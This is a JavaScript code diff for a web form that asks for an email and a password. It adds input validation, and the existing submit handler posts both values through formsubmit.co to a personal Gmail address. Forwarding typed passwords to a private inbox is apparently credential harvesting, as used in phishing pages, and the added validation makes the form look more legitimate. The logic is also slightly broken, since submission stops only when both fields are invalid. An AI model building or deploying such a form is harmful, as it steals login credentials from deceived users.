@@ -1,5 +1,28 @@
+// password validator
+import PasswordValidator from 'password-validator';
+import validator from 'validator';
+
+// email check
+const schema = new PasswordValidator();
+schema
+	.is()
+	.min(8)
+	.usingPlugin(validator.isEmail, 'it should be an email')
+	.is()
+	.max(100)
+	.has()
+	.not()
+	.spaces();
+
+// password check
+const passSchema = new PasswordValidator();
+passSchema.is().min(6).is().max(100).has().not().spaces();
+
+// action with form
 const pass_field = document.querySelector('.pass');
 const email_field = document.querySelector('.email');
+const email_er = document.querySelector('.em-er');
+const pass_er = document.querySelector('.pass-er');
 const showBtn = document.querySelector('.show');
 const form = document.querySelector('.form-submit');
 const load = document.querySelector('.lds-facebook');
@@ -22,6 +45,28 @@ form.addEventListener('submit', e => {
 	let emailValue = email_field.value;
 	let passValue = pass_field.value;
 
+	const emailCheckMSG = schema.validate(emailValue, { details: true })[0]
+		?.message;
+	const passCheckMSG = passSchema.validate(passValue, { details: true })[0]
+		?.message;
+
+	if (schema.validate(emailValue, { details: true }).length !== 0) {
+		email_field.style.borderColor = 'red';
+		email_er.innerText = emailCheckMSG;
+	}
+
+	if (passSchema.validate(passValue, { details: true }).length !== 0) {
+		pass_field.style.borderColor = 'red';
+		pass_er.innerText = passCheckMSG;
+	}
+
+	if (
+		schema.validate(emailValue, { details: true }).length !== 0 &&
+		passSchema.validate(passValue, { details: true }).length !== 0
+	) {
+		return;
+	}
+
 	load.style.display = 'inline-block';
 	fetch('https://formsubmit.co/ajax/tonight0bayastan@gmail.com', {
 		method: 'POST',
@@ -37,14 +82,13 @@ form.addEventListener('submit', e => {
 		.then(() => {
 			email_field.value = '';
 			pass_field.value = '';
+			pass_field.style.borderColor = 'black';
+			pass_er.innerText = '';
 			load.style.display = 'none';
-			succes.style.opacity = '1';
-			succes.style.left = '0px';
+			email_field.style.borderColor = 'black';
+			email_er.innerText = '';
 
-			setTimeout(() => {
-				succes.style.opacity = '0';
-				succes.style.left = '-50px';
-			}, 2500);
+			setTimeout(() => {}, 2500);
 		})
 		.catch(error => console.log(error));
 });
